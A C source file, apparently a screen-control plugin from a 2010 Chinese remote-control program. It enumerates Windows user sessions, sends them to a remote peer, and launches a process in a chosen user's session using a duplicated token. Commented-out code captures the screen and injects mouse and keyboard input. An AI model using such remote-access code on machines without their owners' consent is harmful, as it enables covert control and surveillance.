/*
开发作者:可明
开发日期:2010.8
远程控制编程讨论群:30660169,6467438
*/

#include "../kms/km_head.h"
#include <stdio.h>
#include <Tlhelp32.h>
#include <Userenv.h>

pshare_main g_share_main = NULL;
//HANDLE              hdib ;
/*
HANDLE  MakeDib(pio_socket i_socket, HBITMAP hbitmap, UINT bits )
{
	HDC                 hdc ;
	BITMAP              bitmap ;
	UINT                wLineLen ;
	DWORD               dwSize ;
	DWORD               wColSize ;
	LPBITMAPINFOHEADER  lpbi ;
	LPBYTE              lpBits ;

	GetObject(hbitmap,sizeof(BITMAP),&bitmap) ;

	wLineLen = (bitmap.bmWidth*bits+31)/32 * 4;
	wColSize = sizeof(RGBQUAD)*((bits <= 8) ? 1<<bits : 0);
	dwSize = sizeof(BITMAPINFOHEADER) + wColSize + (DWORD)(UINT)wLineLen*(DWORD)(UINT)bitmap.bmHeight;

	lpbi = (LPBITMAPINFOHEADER)GlobalLock(hdib) ;
    memset((char*)lpbi, 0x0, dwSize);

	lpbi->biSize = sizeof(BITMAPINFOHEADER) ;
	lpbi->biWidth = bitmap.bmWidth ;
	lpbi->biHeight = bitmap.bmHeight ;
	lpbi->biPlanes = 1 ;
	lpbi->biBitCount = (WORD) bits ;
	lpbi->biCompression = BI_RGB ;
	lpbi->biSizeImage = dwSize - sizeof(BITMAPINFOHEADER) - wColSize ;
	lpbi->biXPelsPerMeter = 0 ;
	lpbi->biYPelsPerMeter = 0 ;
	lpbi->biClrUsed = (bits <= 8) ? 1<<bits : 0;
	lpbi->biClrImportant = 0 ;
    lpbi->biClrUsed = (bits <= 8) ? 1<<bits : 0;

	lpBits = (LPBYTE)(lpbi+1)+wColSize ;    //(char*)lpbi + sizeof(BITMAPINFOHEADER)

	hdc = CreateCompatibleDC(NULL);
	GetDIBits(hdc,hbitmap, 0, bitmap.bmHeight, lpBits, (LPBITMAPINFO)lpbi, DIB_RGB_COLORS);
	DeleteDC(hdc);

	int outlength=i_socket->i_length;

    k_lzw_enchode((unsigned char*)lpbi, dwSize, i_socket->i_buffer, &outlength);

	printf("MakeDib:%d:%d\n", k_sock_send(i_socket, 3, 0, 0, i_socket->i_buffer, outlength), outlength);

    GlobalUnlock(hdib);
    //GlobalFree(hdib);
	return hdib ;
}*/

int
kms_main_screen_frame(pio_socket i_socket, char *buffer, int length)
{
    /*printf("%s\n", "kms_main_screen_frame");
    //pio_data_header pi_data_header = (pio_data_header)buffer;
    RECT rect;
    CURSORINFO pci;
    HWND hwnd = GetDesktopWindow();
    HDC hsrc = GetDC(hwnd);
    GetWindowRect(hwnd,&rect);
    SIZE sz;
    sz.cx = rect.right - rect.left;
    sz.cy = rect.bottom - rect.top;

    HDC hmemdc = CreateCompatibleDC(hsrc);
    HBITMAP hbmp = CreateCompatibleBitmap(hsrc,rect.right,rect.bottom);
    HGDIOBJ holdbmp = SelectObject(hmemdc,hbmp);

    BitBlt(hmemdc,0,0,sz.cx,sz.cx,hsrc,rect.left,rect.top,SRCCOPY);

    pci.cbSize = sizeof(CURSORINFO);
    GetCursorInfo(&pci);
    DrawIconEx(hmemdc,pci.ptScreenPos.x-10, pci.ptScreenPos.y-10, pci.hCursor, 32, 32, 1, NULL, DI_NORMAL);

    SelectObject(hmemdc,holdbmp);
    DeleteObject(hmemdc);
    ReleaseDC(hwnd,hsrc);

    MakeDib(i_socket, hbmp, 8);*/

    return SOCK_LOOP_RECV_HEADER;
}

int kms_main_screen_frame_exit(pio_socket i_socket, char *buffer, int length)
{
    //printf("%s\n","kms_main_screen_frame_exit");
    return SOCK_LOOP_CLOSE;
}

int screen_socket_close(pio_socket i_socket)
{
    //GlobalFree(hdib);
    //printf("%s\n","screen_socket_close");
    return 0;
}

int
km_main_connect(int ret, DWORD dwTrans, pio_socket i_socket, LPOVERLAPPED lpoverlapped)
{
  /*  printf("%s\n", "screen km_main_connect");
    client_ver c_ver;
    if (ret) {
        i_socket->f_call_work = (void*)g_share_main->s_func.kms_func[6];
        i_socket->i_buffer      = (char*)malloc(809600);
        i_socket->i_length      = 809600;
        c_ver.wVersion = g_share_main->c_ver.wVersion;
        c_ver.wSystemVersion = g_share_main->c_ver.wSystemVersion;
        c_ver.c_type = C_SCREEN;

        hdib = GlobalAlloc(GHND,4096000);
        if (!hdib) {
            return SOCK_LOOP_CLOSE ;
        }
        k_sock_send(i_socket, 0, 0, (unsigned long)i_socket->extend, (char*)&c_ver, sizeof(client_ver));
    } else {
        return SOCK_LOOP_CLOSE;
    }*/
    return SOCK_LOOP_RECV_HEADER;
}
/*
BOOL _OpenDesktop(char *desk)
{
    char pvInfo[128] = {0};
    strcpy(pvInfo, "default");

    HDESK hActiveDesktop;
    DWORD dwLen;
    hActiveDesktop = OpenInputDesktop(DF_ALLOWOTHERACCOUNTHOOK, FALSE, MAXIMUM_ALLOWED);
    if(!hActiveDesktop)//打开失败
    {
         return FALSE;
    }
    //获取指定桌面对象的信息，一般情况和屏保状态为default，登陆界面为winlogon
    GetUserObjectInformation(hActiveDesktop, UOI_NAME, pvInfo, sizeof(pvInfo), &dwLen);
    if(dwLen==0)//获取失败
    {
        return FALSE;
    }
    CloseDesktop(hActiveDesktop);
//打开winsta0
    HWINSTA m_hwinsta = OpenWindowStation(desk, FALSE,
                                  WINSTA_ACCESSCLIPBOARD   |
                                  WINSTA_ACCESSGLOBALATOMS |
                                  WINSTA_CREATEDESKTOP     |
                                  WINSTA_ENUMDESKTOPS      |
                                  WINSTA_ENUMERATE         |
                                  WINSTA_EXITWINDOWS       |
                                  WINSTA_READATTRIBUTES    |
                                  WINSTA_READSCREEN        |
                                  WINSTA_WRITEATTRIBUTES);
    if (m_hwinsta == NULL){
        return FALSE;
    }

    if (!SetProcessWindowStation(m_hwinsta)){
          return FALSE;
    }

//打开desktop
    HDESK m_hdesk = OpenDesktop("default", 0, FALSE,
                            DESKTOP_CREATEMENU |
                            DESKTOP_CREATEWINDOW |
                            DESKTOP_ENUMERATE    |
                            DESKTOP_HOOKCONTROL |
                            DESKTOP_JOURNALPLAYBACK |
                            DESKTOP_JOURNALRECORD |
                            DESKTOP_READOBJECTS |
                            DESKTOP_SWITCHDESKTOP |
                            DESKTOP_WRITEOBJECTS);
    if (m_hdesk == NULL){
       return FALSE;
    }

    SetThreadDesktop(m_hdesk);
    return TRUE;
}*/

int exec(DWORD dwSessionId, char *path)
{
    HANDLE hTokenDup = NULL;
    STARTUPINFO si = {1};

    PROCESS_INFORMATION pi = {0};

    si.cb = sizeof(si);
    //DWORD dwSessionId=atoi("1"); //与会话进行连接

    BOOL bRes = k_WTSQueryUserToken(dwSessionId, &hTokenDup);
    if (!bRes) {
        //OutputDebugString("WTSQueryUserToken Failed!%d\n");
    }

    HANDLE hDuplicatedToken = NULL;

    if (DuplicateTokenEx(hTokenDup, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hDuplicatedToken) == FALSE) {
        //OutputDebugString("DuplicateTokenEx Failed!%d\n");
    }

    if (CreateProcessAsUser(hDuplicatedToken, NULL, path, NULL, NULL, FALSE,
                                NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE,
                       NULL, NULL, &si, &pi) == FALSE) {
        //char tt[122]={0};
        //sprintf(tt,"%s:%d","CreateProcessAsUser", (int)GetLastError());
        //OutputDebugString(tt);

    }
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hDuplicatedToken);
    CloseHandle(hTokenDup);
    return 0;
}



int
kms_main_screen_connect(pio_socket i_socket, char *buffer, int length)
{
    char temp[1024] = {0};
    char *find;
    pio_data_header pi_data_header = (pio_data_header)buffer;
    printf("%s:%s\n", "kms_main_screen_connect", buffer + sizeof(io_data_header));
    find = strstr(buffer + sizeof(io_data_header), ":");
    *find = '\0';
    find ++;

    sprintf(temp, "%s%s.tmp %s %d %d",g_share_main->km_mod_path ,find, g_share_main->remote_addr, g_share_main->remote_port, (int)pi_data_header->crc32);
    //WinExec(temp, SW_SHOW);
    exec(atol(buffer + sizeof(io_data_header)), temp);
    return SOCK_LOOP_RECV_HEADER;
   // if (!_OpenDesktop(buffer + sizeof(io_data_header)))
   //     return SOCK_LOOP_RECV_HEADER;

    /*HDESK   hdeskCurrent;
    HDESK   hdesk;
    HWINSTA hwinstaCurrent;
    HWINSTA hwinsta;

    hwinstaCurrent = GetProcessWindowStation();
    if (hwinstaCurrent == NULL) {
        OutputDebugString("GetProcessWindowStation");
       return SOCK_LOOP_RECV_HEADER;
    }
    hdeskCurrent = GetThreadDesktop(GetCurrentThreadId());
    if (hdeskCurrent == NULL) {
        OutputDebugString("GetThreadDesktop");
       return SOCK_LOOP_RECV_HEADER;
    }
    hwinsta = OpenWindowStation("\\Sessions\\1\\Windows\\WindowStations\\WinSta1", FALSE,
                                  WINSTA_ACCESSCLIPBOARD   |
                                  WINSTA_ACCESSGLOBALATOMS |
                                  WINSTA_CREATEDESKTOP     |
                                  WINSTA_ENUMDESKTOPS      |
                                  WINSTA_ENUMERATE         |
                                  WINSTA_EXITWINDOWS       |
                                  WINSTA_READATTRIBUTES    |
                                  WINSTA_READSCREEN        |
                                  WINSTA_WRITEATTRIBUTES);
    if (hwinsta == NULL){
        OutputDebugString(buffer + sizeof(io_data_header));
        OutputDebugString("OpenWindowStation");
       return SOCK_LOOP_RECV_HEADER;
    }
    if (!SetProcessWindowStation(hwinsta)){
        OutputDebugString("SetProcessWindowStation");
       return SOCK_LOOP_RECV_HEADER;
    }
    hdesk = OpenDesktop("default", 0, FALSE,
                            DESKTOP_CREATEMENU |
                            DESKTOP_CREATEWINDOW |
                            DESKTOP_ENUMERATE    |
                            DESKTOP_HOOKCONTROL  |
                            DESKTOP_JOURNALPLAYBACK |
                            DESKTOP_JOURNALRECORD |
                            DESKTOP_READOBJECTS |
                            DESKTOP_SWITCHDESKTOP |
                            DESKTOP_WRITEOBJECTS);
    if (hdesk == NULL){
        OutputDebugString("OpenDesktop");
       return SOCK_LOOP_RECV_HEADER;
    }
    SetThreadDesktop(hdesk);

    k_sock_connect(g_share_main->remote_addr, g_share_main->remote_port, km_main_connect, screen_socket_close, (void*)pi_data_header->crc32);
    return SOCK_LOOP_RECV_HEADER;*/
}

int
kms_main_screen_mouse_click(pio_socket i_socket, char *buffer, int length)
{
   /* printf("%s\n", "kms_main_screen_mouse_click");
    POINT *ptCursor = (POINT*)(buffer + sizeof(io_data_header));
    SetCursorPos(ptCursor->x, ptCursor->y);
    mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
    mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);*/
    return SOCK_LOOP_RECV_HEADER;
}

int
kms_main_screen_mouse_right(pio_socket i_socket, char *buffer, int length)
{
   /* printf("%s\n", "kms_main_screen_mouse_right");
    POINT *ptCursor = (POINT*)(buffer + sizeof(io_data_header));
    SetCursorPos(ptCursor->x, ptCursor->y);
    mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
    mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);*/
    return SOCK_LOOP_RECV_HEADER;
}

int
kms_main_screen_char(pio_socket i_socket, char *buffer, int length)
{
    /*pio_data_header pi_data_header = (pio_data_header)buffer;

    keybd_event((byte)pi_data_header->crc32, MapVirtualKey((byte)pi_data_header->crc32, 0), 0, 0);
	keybd_event((byte)pi_data_header->crc32, MapVirtualKey((byte)pi_data_header->crc32, 0), KEYEVENTF_KEYUP, 0);
*/
    return SOCK_LOOP_RECV_HEADER;
}

int
kms_main_screen_count(pio_socket i_socket, char *buffer, int length)
{
    WTS_SESSION_INFO *sessionInfo = NULL;
    DWORD sessionInfoCount;
    BOOL result = k_WTSEnumerateSessions(NULL, 0, 1, &sessionInfo, &sessionInfoCount);
    if (result) {
        int i =0;
        for (i=0; i<sessionInfoCount; i++) {
            //printf("ID:%d\n",sessionInfo[i].SessionId);
            OutputDebugString(sessionInfo[i].pWinStationName);
        }
        k_sock_send(i_socket, 3, 1, 0, (char*)sessionInfo, sizeof(WTS_SESSION_INFO)*sessionInfoCount);
        k_WTSFreeMemory(sessionInfo);
    }
    return SOCK_LOOP_RECV_HEADER;
}

kms_event_func event_funcs[] = {
    kms_main_screen_connect,
    kms_main_screen_frame,
    kms_main_screen_frame_exit,
    kms_main_screen_mouse_click,
    kms_main_screen_mouse_right,
    kms_main_screen_char,
    kms_main_screen_count
};

int __declspec(dllexport) initialize(pshare_main ps_main)
{
    g_share_main = ps_main;
    g_share_main->event_funcs[3].event_funcs = event_funcs;
    g_share_main->event_funcs[3].count = 7;
    return 0;
}
